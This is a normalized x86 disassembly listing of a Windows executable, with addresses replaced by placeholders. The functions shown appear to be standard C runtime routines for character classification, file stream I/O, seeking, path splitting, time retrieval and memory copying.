call sub_414ec0
add esp 0xc
jmp r-xdata
xor eax eax
jmp r-xdata
sub_40ef05
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_40e5f8
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov eax [ eax + 0xc8 ]
mov ecx [ ebp + 0x8 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x103
lea eax [ ebp - 0x10 ]
push eax
push 0x103
push [ ebp + 0x8 ]
call sub_415013
add esp 0xc
jmp r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_40ef5b
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_40ef05
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ rw-data ]
movzx eax [ ecx + eax * 2 ]
and eax 0x103
pop ebp
retn
sub_40ef8b
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_40e5f8
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov eax [ eax + 0xc8 ]
mov ecx [ ebp + 0x8 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x4
lea eax [ ebp - 0x10 ]
push eax
push 0x4
push [ ebp + 0x8 ]
call sub_415013
add esp 0xc
jmp r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_40efdc
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_40ef8b
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ rw-data ]
movzx eax [ ecx + eax * 2 ]
and eax 0x4
pop ebp
retn
sub_40f00a
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov ecx [ ebp + 0x8 ]
push ebx
mov ebx [ ebp + 0xc ]
push esi
push edi
xor edi edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] ebx
cmp [ ebp + 0x10 ] edi
je r-xdata
xor eax eax
cmp [ ebp + 0x14 ] edi
je r-xdata
cmp ecx edi
jne r-xdata
mov esi [ ebp + 0x18 ]
cmp esi edi
je r-xdata
call sub_410cee
push edi
push edi
push edi
push edi
mov [ eax ] 0x16
push edi
cmp ebx 0xffffffff
je r-xdata
or eax 0xffffffff
xor edx edx
div [ ebp + 0x10 ]
cmp [ ebp + 0x14 ] eax
jbe r-xdata
cmp esi edi
je r-xdata
push ebx
push edi
push ecx
call sub_414890
add esp 0xc
mov edi [ ebp + 0x10 ]
imul edi [ ebp + 0x14 ]
test [ esi + 0xc ] 0x10c
mov [ ebp - 0x10 ] edi
mov ebx edi
je r-xdata
or eax 0xffffffff
xor edx edx
div [ ebp + 0x10 ]
cmp [ ebp + 0x14 ] eax
ja r-xdata
mov [ ebp - 0xc ] 0x1000
mov eax [ esi + 0x18 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
mov eax [ ebp + 0x14 ]
jmp r-xdata
test [ esi + 0xc ] 0x10c
je r-xdata
test edi edi
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
cmp ebx [ ebp - 0xc ]
jb r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
push esi
call sub_4150cb
pop ecx
cmp eax 0xffffffff
je r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
jl r-xdata
mov eax edi
sub eax ebx
xor edx edx
div [ ebp + 0x10 ]
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax 0x7fffffff
cmp ebx eax
ja r-xdata
mov ecx 0x7fffffff
xor edx edx
cmp ebx ecx
jbe r-xdata
or [ esi + 0xc ] 0x20
mov edi ebx
cmp ebx eax
jb r-xdata
cmp [ ebp + 0xc ] 0xffffffff
je r-xdata
mov ecx [ ebp - 0x8 ]
inc [ ebp - 0x8 ]
mov [ ecx ] al
mov eax [ esi + 0x18 ]
dec ebx
dec [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
cmp eax [ ebp - 0x4 ]
ja r-xdata
mov eax ebx
mov eax ebx
div [ ebp - 0xc ]
mov eax ebx
mov eax ecx
div [ ebp - 0xc ]
mov eax ecx
jmp r-xdata
cmp edi [ ebp - 0x4 ]
ja r-xdata
mov edi eax
call sub_410cee
mov [ eax ] 0x22
xor eax eax
push eax
push eax
push eax
push eax
push eax
jmp r-xdata
push [ ebp + 0xc ]
push 0x0
push [ ebp + 0x8 ]
call sub_414890
add esp 0xc
push eax
push [ ebp - 0x8 ]
push esi
call sub_40fd92
pop ecx
push eax
call sub_4157b8
add esp 0xc
test eax eax
je r-xdata
sub eax edx
jmp r-xdata
xor esi esi
cmp [ ebp + 0xc ] 0xffffffff
je r-xdata
push edi
push [ esi ]
push [ ebp - 0x4 ]
push [ ebp - 0x8 ]
call sub_40f306
sub [ esi + 0x4 ] edi
add [ esi ] edi
add [ ebp - 0x8 ] edi
sub ebx edi
add esp 0x10
sub [ ebp - 0x4 ] edi
mov edi [ ebp - 0x10 ]
jmp r-xdata
call sub_40edf4
add esp 0x14
or [ esi + 0xc ] 0x10
jmp r-xdata
cmp eax 0xffffffff
je r-xdata
call sub_410cee
push esi
push esi
push esi
push esi
mov [ eax ] 0x22
push esi
jmp r-xdata
push [ ebp + 0xc ]
push esi
push [ ebp + 0x8 ]
call sub_414890
add esp 0xc
test ebx ebx
jne r-xdata
add [ ebp - 0x8 ] eax
sub ebx eax
sub [ ebp - 0x4 ] eax
jmp r-xdata
sub_40f214
push 0xc
push r--data
call sub_4143e0
xor esi esi
mov [ ebp - 0x1c ] esi
cmp [ ebp + 0x10 ] esi
je r-xdata
xor eax eax
cmp [ ebp + 0x14 ] esi
je r-xdata
cmp [ ebp + 0x18 ] esi
jne r-xdata
push [ ebp + 0x18 ]
call sub_4149e1
pop ecx
mov [ ebp - 0x4 ] esi
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40f00a
add esp 0x14
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40f2a0
mov eax [ ebp - 0x1c ]
jmp r-xdata
cmp [ ebp + 0xc ] 0xffffffff
je r-xdata
call sub_414425
retn
call sub_410cee
mov [ eax ] 0x16
push esi
push esi
push esi
push esi
push esi
call sub_40edf4
add esp 0x14
push [ ebp + 0xc ]
push esi
push [ ebp + 0x8 ]
call sub_414890
add esp 0xc
sub_40f306
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x14 ]
push edi
xor edi edi
cmp esi edi
jne r-xdata
cmp [ ebp + 0x8 ] edi
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ ebp + 0x10 ] edi
je r-xdata
call sub_410cee
push 0x16
pop esi
mov [ eax ] esi
pop edi
pop esi
pop ebp
retn
push [ ebp + 0xc ]
push edi
push [ ebp + 0x8 ]
call sub_414890
add esp 0xc
cmp [ ebp + 0x10 ] edi
je r-xdata
cmp [ ebp + 0xc ] esi
jb r-xdata
cmp [ ebp + 0xc ] esi
jae r-xdata
push esi
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
call sub_4158c0
add esp 0xc
jmp r-xdata
push 0x16
pop eax
call sub_410cee
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
push edi
push edi
push edi
push edi
push edi
call sub_40edf4
add esp 0x14
mov eax esi
jmp r-xdata
sub_40f383
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
push ebx
push esi
push edi
xor edi edi
cmp [ ebp + 0xc ] edi
je r-xdata
xor eax eax
cmp [ ebp + 0x10 ] edi
je r-xdata
mov esi [ ebp + 0x14 ]
cmp esi edi
jne r-xdata
mov ecx [ ebp + 0x8 ]
cmp ecx edi
je r-xdata
call sub_410cee
push edi
push edi
push edi
push edi
push edi
mov [ eax ] 0x16
call sub_40edf4
add esp 0x14
or eax 0xffffffff
xor edx edx
div [ ebp + 0xc ]
cmp [ ebp + 0x10 ] eax
ja r-xdata
mov edi [ ebp + 0xc ]
imul edi [ ebp + 0x10 ]
test [ esi + 0xc ] 0x10c
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0xc ] edi
mov ebx edi
je r-xdata
mov [ ebp - 0x8 ] 0x1000
mov eax [ esi + 0x18 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp + 0x10 ]
jmp r-xdata
mov ecx [ esi + 0xc ]
and ecx 0x108
je r-xdata
test edi edi
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
cmp ebx [ ebp - 0x8 ]
jb r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax ]
push esi
push eax
call sub_410d37
pop ecx
pop ecx
cmp eax 0xffffffff
je r-xdata
test ecx ecx
je r-xdata
jl r-xdata
mov eax edi
inc [ ebp - 0x4 ]
mov eax [ esi + 0x18 ]
dec ebx
mov [ ebp - 0x8 ] eax
test eax eax
jg r-xdata
cmp [ ebp - 0x8 ] 0x0
mov edi ebx
je r-xdata
push esi
call sub_416434
pop ecx
test eax eax
jne r-xdata
or [ esi + 0xc ] 0x20
mov edi ebx
cmp ebx eax
jb r-xdata
test ebx ebx
jne r-xdata
mov [ ebp - 0x8 ] 0x1
push edi
push [ ebp - 0x4 ]
push esi
call sub_40fd92
pop ecx
push eax
call sub_416358
add esp 0xc
cmp eax 0xffffffff
je r-xdata
xor edx edx
mov eax ebx
div [ ebp - 0x8 ]
sub edi edx
push edi
push [ ebp - 0x4 ]
push [ esi ]
call sub_4158c0
sub [ esi + 0x4 ] edi
add [ esi ] edi
add esp 0xc
sub ebx edi
add [ ebp - 0x4 ] edi
jmp r-xdata
mov edi eax
or [ esi + 0xc ] 0x20
mov eax [ ebp - 0xc ]
jmp r-xdata
mov ecx edi
cmp eax edi
ja r-xdata
mov edi [ ebp - 0xc ]
jmp r-xdata
sub eax ebx
xor edx edx
div [ ebp + 0xc ]
jmp r-xdata
add [ ebp - 0x4 ] ecx
sub ebx ecx
cmp eax edi
jb r-xdata
mov ecx eax
sub_40f4e5
push 0xc
push r--data
call sub_4143e0
xor esi esi
cmp [ ebp + 0xc ] esi
je r-xdata
xor eax eax
cmp [ ebp + 0x10 ] esi
je r-xdata
xor eax eax
cmp [ ebp + 0x14 ] esi
setne al
cmp eax esi
jne r-xdata
push [ ebp + 0x14 ]
call sub_4149e1
pop ecx
mov [ ebp - 0x4 ] esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40f383
add esp 0x10
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40f55d
mov eax [ ebp - 0x1c ]
jmp r-xdata
call sub_410cee
mov [ eax ] 0x16
push esi
push esi
push esi
push esi
push esi
call sub_40edf4
add esp 0x14
call sub_414425
retn
sub_40f567
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
push ebx
push edi
mov edi [ ebp + 0x8 ]
xor ebx ebx
cmp edi ebx
jne r-xdata
push edi
call sub_40fd92
cmp [ edi + 0x4 ] ebx
pop ecx
mov [ ebp - 0x4 ] eax
jge r-xdata
call sub_410cee
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_40edf4
add esp 0x14
push 0x1
push ebx
push eax
call sub_416890
add esp 0xc
cmp eax ebx
mov [ ebp - 0x8 ] eax
jl r-xdata
mov [ edi + 0x4 ] ebx
pop edi
pop ebx
leave
retn
or eax 0xffffffff
jmp r-xdata
mov edx [ edi + 0xc ]
test edx 0x108
jne r-xdata
mov eax [ edi ]
mov ecx [ edi + 0x8 ]
push esi
mov esi eax
sub esi ecx
mov [ ebp - 0xc ] esi
test dl 0x3
je r-xdata
sub eax [ edi + 0x4 ]
jmp r-xdata
test dl dl
js r-xdata
mov edx [ ebp - 0x4 ]
mov esi [ ebp - 0x4 ]
sar edx 0x5
mov edx [ edx * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
test [ edx + esi + 0x4 ] 0x80
je r-xdata
cmp [ ebp - 0x8 ] ebx
jne r-xdata
call sub_410cee
mov [ eax ] 0x16
jmp r-xdata
mov edx ecx
cmp edx eax
jae r-xdata
test [ edi + 0xc ] 0x1
je r-xdata
mov eax [ ebp - 0xc ]
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
mov esi eax
mov eax [ ebp - 0xc ]
mov ecx [ ebp - 0x8 ]
add eax ecx
mov edx [ edi + 0x4 ]
cmp edx ebx
jne r-xdata
pop esi
inc edx
cmp edx esi
jb r-xdata
inc [ ebp - 0xc ]
xor ebx ebx
mov ebx [ ebp - 0x4 ]
mov esi [ ebp - 0x4 ]
sub eax ecx
add eax edx
sar ebx 0x5
and esi 0x1f
lea ebx [ ebx * 4 + rw-data ]
mov [ ebp + 0x8 ] eax
mov eax [ ebx ]
shl esi 0x6
test [ eax + esi + 0x4 ] 0x80
je r-xdata
mov [ ebp - 0xc ] ebx
jmp r-xdata
cmp [ edx ] 0xa
jne r-xdata
mov eax [ ebp + 0x8 ]
sub [ ebp - 0x8 ] eax
push 0x2
push 0x0
push [ ebp - 0x4 ]
call sub_416890
add esp 0xc
cmp eax [ ebp - 0x8 ]
jne r-xdata
push 0x0
push [ ebp - 0x8 ]
push [ ebp - 0x4 ]
call sub_416890
add esp 0xc
test eax eax
jge r-xdata
mov eax [ edi + 0x8 ]
mov ecx [ ebp + 0x8 ]
add ecx eax
jmp r-xdata
mov eax 0x200
cmp [ ebp + 0x8 ] eax
ja r-xdata
cmp eax ecx
jb r-xdata
mov eax [ edi + 0x18 ]
mov ecx [ edi + 0xc ]
test cl 0x8
je r-xdata
cmp [ eax ] 0xa
jne r-xdata
test [ edi + 0xc ] 0x2000
jmp r-xdata
inc [ ebp + 0x8 ]
test ecx 0x400
je r-xdata
inc eax
inc [ ebp + 0x8 ]
je r-xdata
mov [ ebp + 0x8 ] eax
mov eax [ ebx ]
test [ eax + esi + 0x4 ] 0x4
sub_40f704
push 0xc
push r--data
call sub_4143e0
xor eax eax
xor esi esi
cmp [ ebp + 0x8 ] esi
setne al
cmp eax esi
jne r-xdata
push [ ebp + 0x8 ]
call sub_4149e1
pop ecx
mov [ ebp - 0x4 ] esi
push [ ebp + 0x8 ]
call sub_40f567
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40f768
mov eax [ ebp - 0x1c ]
call sub_410cee
mov [ eax ] 0x16
push esi
push esi
push esi
push esi
push esi
call sub_40edf4
add esp 0x14
or eax 0xffffffff
jmp r-xdata
call sub_414425
retn
sub_40f772
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0xc ]
test al 0x83
jne r-xdata
and eax 0xffffffef
cmp [ ebp + 0x10 ] 0x1
mov [ esi + 0xc ] eax
jne r-xdata
call sub_410cee
mov [ eax ] 0x16
or eax 0xffffffff
jmp r-xdata
push esi
call sub_416434
mov eax [ esi + 0xc ]
pop ecx
test al al
jns r-xdata
push esi
call sub_40f567
add [ ebp + 0xc ] eax
and [ ebp + 0x10 ] 0x0
pop ecx
pop esi
pop ebp
retn
test al 0x1
je r-xdata
and eax 0xfffffffc
mov [ esi + 0xc ] eax
jmp r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call sub_40fd92
pop ecx
push eax
call sub_416890
xor ecx ecx
add esp 0xc
cmp eax 0xffffffff
setne cl
dec ecx
mov eax ecx
test al 0x8
je r-xdata
test eax 0x400
jne r-xdata
mov [ esi + 0x18 ] 0x200
sub_40f7fc
push 0xc
push r--data
call sub_4143e0
xor eax eax
xor esi esi
cmp [ ebp + 0x8 ] esi
setne al
cmp eax esi
jne r-xdata
mov edi [ ebp + 0x10 ]
cmp edi esi
je r-xdata
call sub_410cee
mov [ eax ] 0x16
push esi
push esi
push esi
push esi
push esi
call sub_40edf4
add esp 0x14
or eax 0xffffffff
jmp r-xdata
push [ ebp + 0x8 ]
call sub_4149e1
pop ecx
mov [ ebp - 0x4 ] esi
push edi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40f772
add esp 0xc
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40f877
mov eax [ ebp - 0x1c ]
cmp edi 0x1
je r-xdata
call sub_414425
retn
cmp edi 0x2
jne r-xdata
sub_40f881
mov edi edi
push ebp
mov ebp esp
sub esp 0x28
push ebx
push esi
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_40e5f8
mov esi [ ebp + 0x8 ]
xor ebx ebx
cmp esi ebx
jne r-xdata
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
call sub_410cee
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_40edf4
add esp 0x14
cmp [ ebp - 0x4 ] bl
je r-xdata
movzx ecx [ esi ]
mov eax [ eax + 0xc8 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x8
lea eax [ ebp - 0x10 ]
push eax
movzx eax [ esi ]
push 0x8
push eax
call sub_415013
add esp 0xc
jmp r-xdata
fldz
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
lea eax [ ebp - 0x10 ]
push eax
push ebx
push ebx
push esi
call sub_410680
pop ecx
push eax
lea eax [ ebp - 0x28 ]
push esi
push eax
call sub_41696c
fld [ eax + 0x10 ]
add esp 0x18
cmp [ ebp - 0x4 ] bl
je r-xdata
inc esi
jmp r-xdata
cmp eax ebx
je r-xdata
pop esi
pop ebx
leave
retn
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
sub_40f94f
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_40f93f
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_40f2fb
pop ecx
sub_40f970
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
add ecx 0x9
push ecx
add eax 0x9
push eax
call sub_417200
neg eax
pop ecx
sbb eax eax
pop ecx
inc eax
pop ebp
retn 0x4
sub_40f990
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push ebx
xor ebx ebx
push esi
push edi
mov [ ebp - 0x8 ] ebx
cmp [ ebp + 0x8 ] ebx
je r-xdata
mov [ ebp - 0x8 ] 0x1
jmp r-xdata
mov ecx [ ebp + 0xc ]
cmp ecx ebx
jne r-xdata
mov eax [ ebp + 0xc ]
cmp eax ebx
je r-xdata
cmp [ ebp + 0x10 ] ebx
je r-xdata
cmp [ ebp + 0x10 ] ebx
jne r-xdata
mov eax [ ebp + 0x14 ]
cmp eax ebx
je r-xdata
cmp [ ebp + 0x10 ] ebx
jbe r-xdata
cmp [ ebp + 0x14 ] ebx
jne r-xdata
jmp r-xdata
mov eax [ ebp + 0x1c ]
cmp eax ebx
je r-xdata
cmp [ ebp + 0x18 ] ebx
jbe r-xdata
mov [ eax ] bl
cmp [ ebp + 0x18 ] ebx
je r-xdata
cmp [ ebp + 0x18 ] ebx
jne r-xdata
mov eax [ ebp + 0x24 ]
cmp eax ebx
je r-xdata
cmp [ ebp + 0x20 ] ebx
jbe r-xdata
mov [ eax ] bl
cmp [ ebp + 0x1c ] ebx
jne r-xdata
jmp r-xdata
call sub_410cee
cmp [ ebp + 0x8 ] ebx
jne r-xdata
cmp [ ebp + 0x28 ] ebx
jbe r-xdata
mov [ eax ] bl
cmp [ ebp + 0x20 ] ebx
je r-xdata
cmp [ ebp + 0x20 ] ebx
jne r-xdata
cmp [ ebp - 0x8 ] ebx
jne r-xdata
push 0x16
pop esi
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] esi
call sub_40edf4
add esp 0x14
mov eax esi
jmp r-xdata
mov [ eax ] bl
cmp [ ebp + 0x24 ] ebx
jne r-xdata
jmp r-xdata
push 0x22
pop ecx
mov [ eax ] ecx
mov eax ecx
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
cmp [ ebp + 0x28 ] ebx
jne r-xdata
cmp [ ebp + 0x28 ] ebx
jne r-xdata
mov esi [ ebp + 0x8 ]
xor eax eax
inc eax
cmp [ esi ] 0x3a
jne r-xdata
dec eax
inc esi
cmp eax ebx
ja r-xdata
cmp ecx ebx
je r-xdata
cmp ecx ebx
je r-xdata
cmp [ esi ] bl
je r-xdata
mov esi [ ebp + 0x8 ]
xor edi edi
mov [ ebp - 0x4 ] ebx
cmp [ esi ] bl
je r-xdata
mov [ ecx ] bl
inc esi
mov [ ebp + 0x8 ] esi
jmp r-xdata
cmp [ ebp + 0x10 ] 0x3
jb r-xdata
mov eax [ ebp + 0x14 ]
cmp eax ebx
je r-xdata
movsx eax [ esi ]
push eax
call sub_4172f4
pop ecx
test eax eax
je r-xdata
push 0x2
push [ ebp + 0x8 ]
push 0xffffffff
push ecx
call sub_41730c
add esp 0x10
mov eax [ ebp - 0x4 ]
cmp eax ebx
je r-xdata
mov [ eax ] bl
mov al [ esi ]
cmp al 0x2f
je r-xdata
inc esi
jmp r-xdata
cmp [ ebp + 0x1c ] ebx
je r-xdata
cmp eax [ ebp + 0x8 ]
jb r-xdata
lea edi [ esi + 0x1 ]
cmp al 0x5c
je r-xdata
inc esi
cmp [ esi ] bl
jne r-xdata
mov eax [ ebp + 0x24 ]
cmp eax ebx
je r-xdata
sub esi [ ebp + 0x8 ]
cmp [ ebp + 0x20 ] esi
ja r-xdata
cmp [ ebp + 0x1c ] ebx
je r-xdata
cmp edi ebx
je r-xdata
cmp al 0x2e
jne r-xdata
xor eax eax
mov [ eax ] bl
push esi
push [ ebp + 0x8 ]
push 0xffffffff
push [ ebp + 0x1c ]
call sub_41730c
add esp 0x10
cmp [ ebp + 0x24 ] ebx
je r-xdata
sub eax [ ebp + 0x8 ]
cmp [ ebp + 0x20 ] eax
jbe r-xdata
cmp [ ebp + 0x14 ] ebx
je r-xdata
mov [ ebp - 0x4 ] esi
jmp r-xdata
sub esi [ ebp - 0x4 ]
cmp [ ebp + 0x28 ] esi
jbe r-xdata
push eax
push [ ebp + 0x8 ]
push 0xffffffff
push [ ebp + 0x1c ]
call sub_41730c
add esp 0x10
mov [ ebp + 0x8 ] edi
jmp r-xdata
mov eax edi
sub eax [ ebp + 0x8 ]
cmp [ ebp + 0x18 ] eax
jbe r-xdata
push esi
push [ ebp - 0x4 ]
push 0xffffffff
push [ ebp + 0x24 ]
call sub_41730c
add esp 0x10
jmp r-xdata
push eax
push [ ebp + 0x8 ]
push 0xffffffff
push [ ebp + 0x14 ]
call sub_41730c
add esp 0x10
sub_40fb82
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x18 ]
neg ecx
sbb ecx ecx
mov eax 0x100
and ecx eax
push ecx
push [ ebp + 0x18 ]
mov ecx [ ebp + 0x14 ]
neg ecx
sbb ecx ecx
and ecx eax
push ecx
mov ecx [ ebp + 0x10 ]
push [ ebp + 0x14 ]
neg ecx
sbb ecx ecx
and ecx eax
mov eax [ ebp + 0xc ]
push ecx
push [ ebp + 0x10 ]
neg eax
sbb eax eax
and eax 0x3
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40f990
add esp 0x24
pop ebp
retn
sub_40fbce
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
xor edi edi
or ebx 0xffffffff
cmp esi edi
jne r-xdata
test [ esi + 0xc ] 0x83
je r-xdata
call sub_410cee
push edi
push edi
push edi
push edi
push edi
mov [ eax ] 0x16
call sub_40edf4
add esp 0x14
or eax ebx
jmp r-xdata
mov [ esi + 0xc ] edi
mov eax ebx
push esi
call sub_416434
push esi
mov ebx eax
call sub_417492
push esi
call sub_40fd92
push eax
call sub_4173c5
add esp 0x10
test eax eax
jge r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ esi + 0x1c ]
cmp eax edi
je r-xdata
or ebx 0xffffffff
jmp r-xdata
push eax
call sub_410135
pop ecx
mov [ esi + 0x1c ] edi
sub_40fc45
push 0xc
push r--data
call sub_4143e0
or [ ebp - 0x1c ] 0xffffffff
xor eax eax
mov esi [ ebp + 0x8 ]
xor edi edi
cmp esi edi
setne al
cmp eax edi
jne r-xdata
test [ esi + 0xc ] 0x40
je r-xdata
call sub_410cee
mov [ eax ] 0x16
push edi
push edi
push edi
push edi
push edi
call sub_40edf4
add esp 0x14
or eax 0xffffffff
jmp r-xdata
push esi
call sub_4149e1
pop ecx
mov [ ebp - 0x4 ] edi
push esi
call sub_40fbce
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40fcb9
jmp r-xdata
mov [ esi + 0xc ] edi
call sub_414425
retn
mov eax [ ebp - 0x1c ]
sub_40fcc1
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
lea eax [ ebp - 0x8 ]
push eax
call [ GetSystemTimeAsFileTime@IAT ]
mov eax [ ebp - 0x8 ]
mov ecx [ ebp - 0x4 ]
push 0x0
add eax 0x2ac18000
push 0x989680
adc ecx 0xfe624e21
push ecx
push eax
call sub_4174d0
cmp edx 0x7
jl r-xdata
mov ecx [ ebp + 0x8 ]
test ecx ecx
je r-xdata
jg r-xdata
leave
retn
mov [ ecx ] eax
mov [ ecx + 0x4 ] edx
or eax 0xffffffff
mov edx eax
cmp eax 0x93406fff
jbe r-xdata
sub_40fd2d
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
jmp r-xdata
push [ ebp + 0x8 ]
call sub_410212
pop ecx
test eax eax
je r-xdata
push [ ebp + 0x8 ]
call sub_417547
pop ecx
test eax eax
je r-xdata
leave
retn
test [ rw-data ] 0x1
mov esi rw-data
jne r-xdata
push esi
lea ecx [ ebp - 0xc ]
call sub_40af60
push r--data
lea eax [ ebp - 0xc ]
push eax
call sub_41070b
int3
or [ rw-data ] 0x1
mov ecx esi
call sub_40fd12
push sub_42130c
call sub_40eaf5
pop ecx
sub_40fd92
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
xor esi esi
cmp eax esi
jne r-xdata
mov eax [ eax + 0x10 ]
call sub_410cee
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_40edf4
add esp 0x14
or eax 0xffffffff
jmp r-xdata
pop esi
pop ebp
retn
sub_40fdd0
push ebp
mov ebp esp
push edi
push esi
mov esi [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
mov edi [ ebp + 0x8 ]
mov eax ecx
mov edx ecx
add eax esi
cmp edi esi
jbe r-xdata
cmp ecx 0x100
jb r-xdata
cmp edi eax
jb r-xdata
test edi 0x3
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
test edi 0x3
jne r-xdata
mov eax edi
mov edx 0x3
sub ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
push edi
push esi
and edi 0xf
and esi 0xf
cmp edi esi
pop esi
pop edi
jne r-xdata
mov eax edi
mov edx 0x3
cmp ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
jmp [ ecx * 4 + r-xdata ]
and eax 0x3
add ecx eax
jmp [ eax * 4 + jump_table_40fe58 ]
jmp [ ecx * 4 + jump_table_40fed8 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_40ff44 ]
pop esi
pop edi
pop ebp
jmp sub_4179d5
jmp [ ecx * 4 + jump_table_4100e0 ]
and eax 0x3
sub ecx eax
jmp [ eax * 4 + jump_table_40ffe4 ]
neg ecx
jmp [ ecx * 4 + r-xdata ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_4100e0 ]
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
add esi 0x3
add edi 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
add esi 0x2
add edi 0x2
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
add esi 0x1
shr ecx 0x2
add edi 0x1
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 - 0x1c ]
mov [ edi + ecx * 4 - 0x1c ] eax
mov eax [ esi + ecx * 4 - 0x18 ]
mov [ edi + ecx * 4 - 0x18 ] eax
mov eax [ esi + ecx * 4 - 0x14 ]
mov [ edi + ecx * 4 - 0x14 ] eax
mov eax [ esi + ecx * 4 - 0x10 ]
mov [ edi + ecx * 4 - 0x10 ] eax
mov eax [ esi + ecx * 4 - 0xc ]
mov [ edi + ecx * 4 - 0xc ] eax
mov eax [ esi + ecx * 4 - 0x8 ]
mov [ edi + ecx * 4 - 0x8 ] eax
mov eax [ esi + ecx * 4 - 0x4 ]
mov [ edi + ecx * 4 - 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
